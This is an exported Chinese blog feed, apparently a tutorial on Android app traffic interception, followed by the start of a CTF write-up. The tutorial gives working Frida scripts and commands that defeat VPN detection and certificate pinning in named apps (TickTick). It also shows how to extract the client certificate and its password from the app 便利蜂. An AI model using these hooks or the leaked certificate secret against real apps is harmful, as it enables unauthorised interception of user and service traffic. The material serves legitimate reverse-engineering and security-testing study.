<h3 id="抓包工具抓HTTPS包的原理"><a href="#抓包工具抓HTTPS包的原理" class="headerlink" title="抓包工具抓HTTPS包的原理"></a>抓包工具抓HTTPS包的原理</h3><p>这个时候抓包工具对客户端来说相当于服务器，对服务器来说相当于客户端。在这个传输过程中，客户端会以为它就是目标服务器，服务器也会以为它就是请求发起的客户端</p>
<ol>
<li>客户端连接抓包工具提供的代理服务</li>
<li>客户端需要安装抓包工具的根证书</li>
<li>客户端发出HTTPS请求，抓包工具模拟服务器与客户端进行TLS握手交换密钥等流程</li>
<li>抓包工具发送一个HTTPS请求给客户端请求的目标服务器，并与目标服务器进行TLS握手交换密钥等流程</li>
<li>客户端使用与抓包工具协定好的密钥加密数据后发送给抓包工具</li>
<li>抓包工具使用与客户端协定好的密钥解密数据，并将结果进行展示</li>
<li>抓包工具将解密后的客户端数据，使用与服务器协定好的密钥进行加密后发送给目标服务器</li>
<li>服务器解密数据后，做对应的逻辑处理，然后将返回结果使用与抓包工具协定好的密钥进行加密发送给抓包工具</li>
<li>抓包工具将服务器返回的结果，用与服务器协定好的密钥解密，并将结果进行展示</li>
<li>抓包工具将解密后的服务器返回数据，使用与客户端协定好的密钥进行加密后发送给客户端</li>
<li>客户端解密数据</li>
</ol>
<h3 id="VPN抓包"><a href="#VPN抓包" class="headerlink" title="VPN抓包"></a>VPN抓包</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>Pixel XL Android8.1、已经root</p>
<p>Postern: 3.1.3</p>
<p>Charles: 4.6.5</p>
<p>Burpsuite: 2023.6</p>
</blockquote>
<p>在没有防止中间人抓包的情况下，我们在之前<a href="https://xiaoeeyu.github.io/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#%E9%85%8D%E7%BD%AE%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83">安装配置抓包环境</a>的文章中已经尝试过了。</p>
<p>但是如果App为了防止中间人抓包，特意设置了不走代理这个选项，那我们单独使用Fiddler、BurpSuite这些工具是抓不到包的。这种情况下可以尝试使用VPN抓包，例如：使用Postern + Charles这个组合，是因为Charles没有直接监听到App，Charles是监听到了Postern上，Postern是VPN，它通过VPN将所有流量转发到Charles的socks代理，再打开Charles的External Proxy Server –（外部代理服务器）转发到Burpsuite，从而实施中间人抓包。</p>
<p>如果有服务器对客户端的校验的话，可以尝试使用VPN代理抓包。这样VPN会代理所有的流量，开启VPN会添加一个网卡这时候等于是我们从应用层的抓包变为了网络层抓包。能抓到手机通过网卡发出去的所有包。这个模式burp不支持，可以使用Charles + Postern进行</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420211247853.png" class="" title="image-20240420211247853">

<p>这个时候我们需要使用socket来抓包，因为HTTPS协议是运行在应用层为应用程序提供服务。而socket是位于传输层的，可以使用这种方式来绕过应用层的检测。</p>
<h4 id="配置socket"><a href="#配置socket" class="headerlink" title="配置socket"></a>配置socket</h4><p>Charles打开socket端口</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420212253526.png" class="" title="image-20240420212253526">

<p>手机Wi-Fi连接socket端口</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420212333931.png" class="" title="image-20240420212333931">

<h4 id="Postern配置代理"><a href="#Postern配置代理" class="headerlink" title="Postern配置代理"></a>Postern配置代理</h4><h6 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h6><p>删除默认的代理并添加自己的代理服务器</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420213954648.png" class="" title="image-20240420213954648">

<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420214443297.png" class="" title="image-20240420214443297">

<h6 id="配置规则"><a href="#配置规则" class="headerlink" title="配置规则"></a>配置规则</h6><p>删除掉其它的规则防止干扰，只保留当前要使用的规则</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420215003916.png" class="" title="image-20240420215003916">

<h6 id="打开-x2F-关闭Postern"><a href="#打开-x2F-关闭Postern" class="headerlink" title="打开/关闭Postern"></a>打开/关闭Postern</h6><img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420215253731.png" class="" title="image-20240420215253731">

<h6 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h6><p>如果打不开网页的话，重启手机试试</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240420220754963.png" class="" title="image-20240420220754963">

<h4 id="Postern-Charles-Burpsuite对App抓包"><a href="#Postern-Charles-Burpsuite对App抓包" class="headerlink" title="Postern + Charles + Burpsuite对App抓包"></a>Postern + Charles + Burpsuite对App抓包</h4><p>Postern还是跟上面一样配置不用修改</p>
<p>打开Charles 勾选 Proxy $\rightarrow$ External Proxy Settings就是要将Charles作为手机端的代理，再由Charles将包转发给Burpsuite。这种情况下对于Charles来说，Burpsuite就成了一个External Proxy Server(外部代理服务器)</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240421100544388-17137163326311.png" class="" title="image-20240421100544388">

<ul>
<li>勾选HTTP和HTTPS代理，这里HTTP和HTTPS的代理服务器地址都是127.0.0.1:8080（这里的配置与Burpsuite代理一致）</li>
</ul>
<p>已经设置了外部代理了，就必须打开 burp（当然了主要是要打开 burp 中对 127.0.0.1:8080 的监听），否则就会出现 连不上网了 的现象。在 burp 的菜单栏中的 Proxy 选项下的 Options 中打开 127.0.0.1:8080 的代理监听（默认应该是已经打开的），在 Intercept 中关闭请求拦截。</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240422184253573.png" class="" title="image-20240422184253573">

<p>配置完成之后在手机上搜索内容，就可以抓到数据包，并且数据包也从Charles转发到Burpsuite了</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240422001731416.png" class="" title="image-20240422001731416">

<h4 id="VPN抓包的对抗-–-VPN检测"><a href="#VPN抓包的对抗-–-VPN检测" class="headerlink" title="VPN抓包的对抗 – VPN检测"></a>VPN抓包的对抗 – VPN检测</h4><p>现在随着使用VPN抓包变成常用手段，很多App会增加一些对抗措施。例如App增加了对VPN是否开启的检测</p>
<ol>
<li><p><code>java.net.NetworkInterface.getName()</code>是检测VPN的API</p>
<pre><code class="js">Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();
while (networkInterfaces.hasMoreElements()) {
    NetworkInterface next = networkInterfaces.nextElement();
    logOutPut("getName获得网络设备名称=" + next.getName());
    logOutPut("getDisplayName获得网络设备显示名称=" + next.getDisplayName());
    logOutPut("getIndex获得网络接口的索引=" + next.getIndex());
    logOutPut("isUp是否已经开启并运行=" + next.isUp());
    logOutPut("isBoopback是否为回调接口=" + next.isLoopback());
}
</code></pre>
<p>可以通过检测返回值否等于<code>tun0</code>或<code>ppp0</code>来判断是否开启VPN，如果开启的话就hook <code>java.net.NetworkInterface.getName()</code>绕过VPN检测</p>
<pre><code class="js">function hook_vpn(){
   Java.perform(function() {
       var NetworkInterface = Java.use("java.net.NetworkInterface");
       NetworkInterface.getName.implementation = function() {
           var name = this.getName();
           console.log("name: " + name);
           if(name == "tun0" || name == "ppp0"){
               return "rmnet_data0";
           }else {
               return name;
           }
       }
   })
}
</code></pre>
<p>如果开启VPN，NetworkCapabilities.hasTransport 会返回 true。通过hook，修改其返回值为false</p>
<pre><code class="js">var NetworkCapabilities = Java.use("android.net.NetworkCapabilities");
NetworkCapabilities.hasTransport.implementation = function () {
    return false;
}
</code></pre>
</li>
</ol>
<p>上面的方法可以过掉大部分VPN检测，如果还有少数VPN检测过不掉，可以通过Objection Hook的方式，大范围hook java库中的网络或系统函数，找出监测点，进行绕过。</p>
<h3 id="服务端校验客户端绕过"><a href="#服务端校验客户端绕过" class="headerlink" title="服务端校验客户端绕过"></a>服务端校验客户端绕过</h3><p>如果服务器要对客户端进行证书校验的话，因为抓包工具本身没有App的证书，所以是无法通过校验的。</p>
<p>这时候我们就要找到证书，然后把证书导入到抓包工具中再进行抓包</p>
<h4 id="举例测试"><a href="#举例测试" class="headerlink" title="举例测试"></a>举例测试</h4><p>便利蜂这个App正好有服务端对客户端证书的校验，接下来我们以这个App为例进行实战测试</p>
<h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><p>直接使用r0capture脚本来获取证书和证书密码</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240511075319817.png" class="" title="image-20240511075319817">

<h6 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h6><blockquote>
<p>frida-server：12.8</p>
<p>Python：3.8.0</p>
<p>Android：8.1</p>
<p>给App打开文件存储的权限</p>
</blockquote>
<h6 id="使用r0capture脚本获取证书信息"><a href="#使用r0capture脚本获取证书信息" class="headerlink" title="使用r0capture脚本获取证书信息"></a>使用r0capture脚本获取证书信息</h6><p><code>frida -U -f com.bianlifeng.customer.android -l script.js --no-pause -o r0capture.txt</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518105102514.png" class="" title="image-20240518105102514">

<ul>
<li><p>在手机路径下查找dump下来的证书文件</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518112900658.png" class="" title="image-20240518112900658">

<ul>
<li>这里dump下来了非常多，随便拿一个就行了</li>
</ul>
</li>
</ul>
<h6 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h6><p>拿到之后，把证书导入到抓包工具中</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518114326096.png" class="" title="image-20240518114326096">

<ul>
<li>导入<strong>p12</strong>文件，密码刚刚也获取到了是<strong>r0ysue</strong></li>
<li>这里的<strong>Host</strong>和<strong>Port</strong>可以填通配符也可以只填写400访问失败的地址</li>
</ul>
<p>导入证书之后再重新抓取登录包</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518115718036.png" class="" title="image-20240518115718036">

<ul>
<li>成功通过校验抓到了数据包</li>
</ul>
<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><p>手动分析找到证书的位置并将其保存成证书文件</p>
<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>参考<a href="https://blog.csdn.net/u013424496/article/details/51161647">这篇文章</a>可知我们可以通过系统中的<code>keyStrore.load</code>拿到证书的名字和密码</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518165901310.png" class="" title="image-20240518165901310">

<ul>
<li>PS：在8.1系统中还生效，在Android10.0的源码中不生效。可能是没有<code>load()</code>这个方法了</li>
</ul>
<p>在Android8.1上可以通过Hook **keyStore.load()**这个接口拿到证书密码</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518111127677.png" class="" title="image-20240518111127677">

<p>拿到之后，因为有壳所以先对便利蜂App进行脱壳然后分析</p>
<h6 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h6><p>使用frida自带的脱壳工具</p>
<p><code>frida-dexdump -UF</code></p>
<ul>
<li>不用指定参数，把App打开放在前台就行</li>
</ul>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518173423763.png" class="" title="image-20240518173423763">

<h6 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h6><p>用<code>grep</code>命令搜索一下关键字，看主要逻辑在哪个dex文件中</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518173829795.png" class="" title="image-20240518173829795">

<ul>
<li>根据搜索的结果<strong>classes07.dex</strong>每次都会出现，那主要逻辑应该就在这个文件中了，分析一下这个文件</li>
</ul>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518175232931.png" class="" title="image-20240518175232931">

<ul>
<li><p><strong>getKeyStore</strong>是一个native函数，那就需要去native中去分析了</p>
<p>分析so之前先定位要分析的函数在哪个so文件中缩小分析范围，可以使用<a href="https://github.com/Simp1er/MobileSec/blob/master/hook_RegisterNative.js">脚本</a>来辅助进行定位（不管静态注册还是动态注册，最终都要走RegisterNative，那此时就可以枚举符号找到符号的地址，通过此地址再结合Frida ModuleMap api可以反推出so的名称）</p>
<blockquote>
<p><strong>脚本报错：</strong></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520014812300.png" class="" title="image-20240520014812300">

<ul>
<li><p>原因是因为这个方法在我们使用的frida12里面没有，在frida14之后才有。所以需要切换一下frida和Python版本</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518233108973.png" class="" title="image-20240518233108973">

<p>重新执行脚本<code>frida -U -f com.bianlifeng.customer.android -l HookRegisterNative.js --runtime=v8</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518233415503.png" class="" title="image-20240518233415503">

<p>定位到了<code>getKeyStore()</code>在<strong>libbreakpad.so</strong>中，offset=&gt;0x6f58</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240518233515197.png" class="" title="image-20240518233515197"></li>
</ul>
</blockquote>
</li>
</ul>
<h6 id="用IDA分析libbreakpad-so"><a href="#用IDA分析libbreakpad-so" class="headerlink" title="用IDA分析libbreakpad.so"></a>用IDA分析libbreakpad.so</h6><img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240519232703324.png" class="" title="image-20240519232703324">

<ul>
<li><p>打开后直接搜索<strong>getKeyStore</strong>搜索到之后按F5，然后如果参数类型不对的话，先把参数类型改了然后其中的一些JNI函数就能识别出来了。</p>
</li>
<li><p>分析反编译出来的代码，发现其中的<strong>FindClass()<strong>的参数</strong>v2</strong>是通过<strong>sub_7B7C</strong>获取到的，那就先hook这个函数看**FindClass()**都加载了什么类</p>
<blockquote>
<pre><code class="js">function hook_dlopen(module_name, fun) {
    var android_dlopen_ext = Module.findExportByName(null, "android_dlopen_ext");

    if (android_dlopen_ext) {
        Interceptor.attach(android_dlopen_ext, {
            onEnter: function (args) {
                var pathptr = args[0];
                if (pathptr) {
                    this.path = (pathptr).readCString();
                    if (this.path.indexOf(module_name) &gt;= 0) {
                        this.canhook = true;
                        console.log("android_dlopen_ext:", this.path);
                    }
                }
            },
            onLeave: function (retval) {
                if (this.canhook) {
                    fun();
                }
            }
        });
    }
    var dlopen = Module.findExportByName(null, "dlopen");
    if (dlopen) {
        Interceptor.attach(dlopen, {
            onEnter: function (args) {
                var pathptr = args[0];
                if (pathptr) {
                    this.path = (pathptr).readCString();
                    if (this.path.indexOf(module_name) &gt;= 0) {
                        this.canhook = true;
                        console.log("dlopen:", this.path);
                    }
                }
            },
            onLeave: function (retval) {
                if (this.canhook) {
                    fun();
                }
            }
        });
    }
    console.log("android_dlopen_ext:", android_dlopen_ext, "dlopen:", dlopen);
}


function hook7B7C(){
    var breakpad = Process.findModuleByName("libbreakpad.so")
    Interceptor.attach(breakpad.base.add('0x7b7c'),{
        onEnter:function(args){
            console.log("entering 7B7C...")
        }, onLeave:function(ret){
            console.log("leaving 7b7c:", ret, ret.readCString())
        }
    })
}

function main() {
    hook_dlopen("libbreakpad.so", hook7B7C);
}

setImmediate(main);
</code></pre>
<p>执行hook脚本：<code>frida -U -f com.bianlifeng.customer.android -l hookartMethod.js --runtime=v8</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520004036542.png" class="" title="image-20240520004036542">

<ul>
<li>根据返回结果可以猜测证书是一个P12类型的，加密使用的base64，参数类型是string和int返回值是byte数组，证书密码是blibee</li>
</ul>
</blockquote>
</li>
</ul>
<h6 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h6><p>继续分析IDA反编译的代码，猜测这段最长的加密字符串就是证书文件</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520012935176.png" class="" title="image-20240520012935176">

<p>根据上一个脚本执行的结果猜测这串字符是base64加密，接下来再写一个脚本hook <strong>android.util.Base64.decode</strong>的所有输出，拿到解密后的字符串</p>
<pre><code class="js">function hookBase64decode(){
    Java.perform(function(){
        Java.use("android/util/Base64").decode.overload('java.lang.String', 'int').implementation = function(str,i){
            var result = this.decode(str,i)
            var ByteString = Java.use("com.android.okhttp.okio.ByteString")
            console.log("str: " + str + "\n" + "i: " + i + "\n" + "result: " + ByteString.of(result).hex())
            return result
        }
    })
}

function main() {
    // hook_dlopen("libbreakpad.so", hook7B7C);
    hookBase64decode();
}

setImmediate(main);
</code></pre>
<p>执行：<code>frida -U -f com.bianlifeng.customer.android -l hookartMethod.js --runtime=v8 --no-pause</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520011441743.png" class="" title="image-20240520011441743">

<h6 id="保存为证书"><a href="#保存为证书" class="headerlink" title="保存为证书"></a>保存为证书</h6><p>把这段result的结果拷贝下来保存为**.p12**文件</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520011841509.png" class="" title="image-20240520011841509">

<p>打开保存的文件，密码是<strong>blibee</strong></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240520012544437.png" class="" title="image-20240520012544437">



<h4 id="混淆后的SSL-Pinning解绑定"><a href="#混淆后的SSL-Pinning解绑定" class="headerlink" title="混淆后的SSL Pinning解绑定"></a>混淆后的SSL Pinning解绑定</h4><p>SSL Pinning（SSL 证书固定）是一种安全机制，旨在防止中间人攻击和伪造证书的攻击。它通过将预定义的服务器证书或公钥嵌入到客户端应用程序中，确保客户端只信任特定的证书或公钥，即使是证书颁发机构（CA）被攻破或信任链出现问题，客户端也能安全地与服务器通信。</p>
<p><strong>环境</strong></p>
<blockquote>
<p>Android: 8.1</p>
<p>frida-server: 14.2.8</p>
<p>pyenv: 3.9.0</p>
<p>frida: 14.2.8</p>
<p>frida-tools: 8.1.2</p>
<p>使用postern开起了vpn抓包，在开始抓包之前可以先拿酷安的App点击登录试一下看抓包环境是否畅通</p>
</blockquote>
<p><strong>案例App</strong>：滴答清单</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240523104537106.png" class="" title="image-20240523104537106">

<ul>
<li>这里是在对SSL Pinning的App进行抓包的时候，因为证书校验不通过，发送登录账号的请求被拒绝了</li>
<li>这种情况说明App做了SSL证书的绑定</li>
</ul>
<h5 id="什么是SSL证书绑定"><a href="#什么是SSL证书绑定" class="headerlink" title="什么是SSL证书绑定"></a>什么是SSL证书绑定</h5><p>Google搜索一下“okhttp3 certificatePinner”，看看 它是怎么实现的</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240525231734665.png" class="" title="image-20240525231734665">

<ul>
<li>官网上写解释了它是用来防止中间人攻击的，例如我们通常情况下的抓包是把一段请求拆分成了两段，那么他的证书肯定是变了的</li>
<li>示例代码中也介绍了它的实现通过提前配置好的域名，在进行握手的过程中验证<strong>客户端/服务器</strong>的证书与预定证书指纹是否相匹配，如果这时候请求的证书是charles的那么校验肯定是失败了的</li>
</ul>
<blockquote>
<p>去<a href="https://github.com/square/okhttp/blob/54238b4c713080c3fd32fb1a070fb5d6814c9a09/okhttp/src/main/kotlin/okhttp3/CertificatePinner.kt#L149">github</a>看一下它的校验函数</p>
<pre><code class="kotlin">fun check(
    hostname: String,
    peerCertificates: List&lt;Certificate&gt;,
  ) {
    return check(hostname) {
      (certificateChainCleaner?.clean(peerCertificates, hostname) ?: peerCertificates)
        .map { it as X509Certificate }
    }
  }

  internal fun check(
    hostname: String,
    cleanedPeerCertificatesFn: () -&gt; List&lt;X509Certificate&gt;,
  ) {
    val pins = findMatchingPins(hostname)
    if (pins.isEmpty()) return

    val peerCertificates = cleanedPeerCertificatesFn()

    for (peerCertificate in peerCertificates) {
      // Lazily compute the hashes for each certificate.
      var sha1: ByteString? = null
      var sha256: ByteString? = null

      for (pin in pins) {
        when (pin.hashAlgorithm) {
          "sha256" -&gt; {
            if (sha256 == null) sha256 = peerCertificate.sha256Hash()
            if (pin.hash == sha256) return // Success!
          }
          "sha1" -&gt; {
            if (sha1 == null) sha1 = peerCertificate.sha1Hash()
            if (pin.hash == sha1) return // Success!
          }
          else -&gt; throw AssertionError("unsupported hashAlgorithm: ${pin.hashAlgorithm}")
        }
      }
    }

    // If we couldn't find a matching pin, format a nice exception.
    val message =
      buildString {
        append("Certificate pinning failure!")
        append("\n  Peer certificate chain:")
        for (element in peerCertificates) {
          append("\n    ")
          append(pin(element))
          append(": ")
          append(element.subjectDN.name)
        }
        append("\n  Pinned certificates for ")
        append(hostname)
        append(":")
        for (pin in pins) {
          append("\n    ")
          append(pin)
        }
      }
    throw SSLPeerUnverifiedException(message)
  }
</code></pre>
<ul>
<li>通过校验确保了只有预定义的证书才能通过验证</li>
</ul>
</blockquote>
<h5 id="标准SSL-Pinning的解绑定"><a href="#标准SSL-Pinning的解绑定" class="headerlink" title="标准SSL Pinning的解绑定"></a>标准SSL Pinning的解绑定</h5><p>比较常用的就是<a href="https://github.com/sensepost/objection/blob/master/agent/src/android/pinning.ts">objection</a></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526000243895.png" class="" title="image-20240526000243895">

<ul>
<li>objection中hook的就是用于校验的<strong>check</strong>函数</li>
</ul>
<h6 id="解绑定"><a href="#解绑定" class="headerlink" title="解绑定"></a>解绑定</h6><p>有一些对各种种类的证书绑定比较全面的<a href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">脚本</a>，拷贝下来试一下</p>
<p>这里用spwn模式运行frida脚本，因为这里hook的okhttp的时机是在创建的时候，所以如果错过了这个点就不生效了</p>
<p><code>frida -U -f cn.ticktick.task -l StandardSSLpinningBypass.js --no-pause</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526002331197.png" class="" title="image-20240526002331197">

<ul>
<li><p>脚本执行成功了可以看到经过了很多hook的点，再试试抓包是否能成功</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526002443399.png" class="" title="image-20240526002443399">

<ul>
<li>还是一样的，没有通过</li>
<li>如果没能成功的话，就怀疑这个证书是不是混淆了</li>
</ul>
</li>
</ul>
<h6 id="混淆证书的解绑定"><a href="#混淆证书的解绑定" class="headerlink" title="混淆证书的解绑定"></a>混淆证书的解绑定</h6><p>怎么对混淆的证书解绑定呢，首先从证书校验的原理考虑，它打开文件的过程肯定是必须的（因为要打开证书文件进行校验）。所以可以考虑使用frida去hook所有打开文件的动作，这里使用<a href="https://github.com/r0ysue/r0tracer/blob/main/r0tracer.js">r0tracer</a>（这个frida脚本是基于frida16的，那我们切换为frida16的环境）</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526003526516.png" class="" title="image-20240526003526516">

<p><strong>切换环境</strong></p>
<blockquote>
<p>frida-server: 16.2.1 </p>
<p>pyenv: 3.12.0</p>
<p>frida: 16.2.1</p>
</blockquote>
<p>执行脚本<code>frida -U -f cn.ticktick.task -l r0tracer.js -o dida.txt</code></p>
<ul>
<li>因为文件操作非常多，所以多等一会儿</li>
<li>结束了之后，去刚刚输出的<strong>dida.txt</strong>文件中查找关键字看能不能找到</li>
</ul>
<p>这里尝试直接搜索我们前面分析查看okhttp代码中间里面的<code>certificatePinner</code></p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526005733253.png" class="" title="image-20240526005733253">

<ul>
<li><p>这里直接找到 了，那用GDA打开apk看一下找到的这个函数是什么</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526011136873.png" class="" title="image-20240526011136873">

<ul>
<li><p>找到了这个函数，看到它的参数跟okhttp源码中的<code>check</code>函数是相同的</p>
</li>
<li><p>另外包括它结尾校验失败抛出的异常也是跟源码中相同的</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526011418954.png" class="" title="image-20240526011418954">

<ul>
<li>所以这个函数大概率就是check函数了，那接下来尝试直接hook它</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>写一个简单的hook脚本直接hook这个函数</p>
<pre><code class="js">Java.perform(function() {
    // 获取目标类
    var TargetClass = Java.use("z1.g");
    // Hook目标方法并重写其实现
    TargetClass.a.implementation = function(x, y) {
        // 打印调用信息
        console.log('z1.g.a called with arguments: ' + x + ', ' + y);
    };
});
</code></pre>
<p>执行脚本<code>frida -U -f cn.ticktick.task -l didaSSLbypass.js </code></p>
<p>然后再点击登录就成功的抓到了数据包</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526012533728.png" class="" title="image-20240526012533728">



<h4 id="flutter库的SSL-Pinning解绑定"><a href="#flutter库的SSL-Pinning解绑定" class="headerlink" title="flutter库的SSL Pinning解绑定"></a>flutter库的SSL Pinning解绑定</h4><p>暂时没找到合适的案例</p>
<p>如果在尝试的时候也无法抓到登录包，包括使用r0capture等脚本也无法抓到包的话。</p>
<p>可以通过反编译查看源码，看主要逻辑是否被flutter包裹了</p>
<img src="/2024/05/26/App%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B%E6%B1%87%E6%80%BB/image-20240526182237451.png" class="" title="image-20240526182237451">

<p>尝试使用一些flutter解绑定的脚本</p>
<p>暂时参考一些帖子吧，找到合适的案例再补上</p>
<p><a href="https://bbs.kanxue.com/thread-280261.htm">flutter抓包绕过-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-261941.htm">原创]一种基于frida和drony的针对flutter抓包的方法-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://github.com/horangi-cyops/flutter-ssl-pinning-bypass">horangi-cyops/flutter-ssl-pinning-bypass: Horangi tools for Android penetration testing (github.com)</a></p>
<p><a href="https://johns.blog.csdn.net/article/details/126115979">flutter抓包</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>抓包工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF003</title>
    <url>/2023/07/09/CTF003/</url>
    <content><![CDATA[<img src="/2023/07/09/CTF003/image-20230709144529782.png" class="" title="image-20230709144529782">

<h3 id="分析函数逻辑"><a href="#分析函数逻辑" class="headerlink" title="分析函数逻辑"></a>分析函数逻辑</h3><p>打开入口函数后，可以发现把校验函数写在so库里了</p>
<img src="/2023/07/09/CTF003/image-20230709144547072.png" class="" title="image-20230709144547072">

<h3 id="IDA分析so库文件"><a href="#IDA分析so库文件" class="headerlink" title="IDA分析so库文件"></a>IDA分析so库文件</h3><p>那接下来用ida打开_native-lib.so_进行分析，文件打开之后可以直接搜索到这个函数，可以看到如果没有动态加载的话，java层映射到native层的本地函数命名特点<strong>Java+包名+函数名</strong></p>
<img src="/2023/07/09/CTF003/image-20230709144600683.png" class="" title="image-20230709144600683">

<h4 id="修复参数"><a href="#修复参数" class="headerlink" title="修复参数"></a>修复参数</h4><p>这个函数解析的看起来比较乱，我们可以修复一下参数类型看会不会好点</p>
<ul>
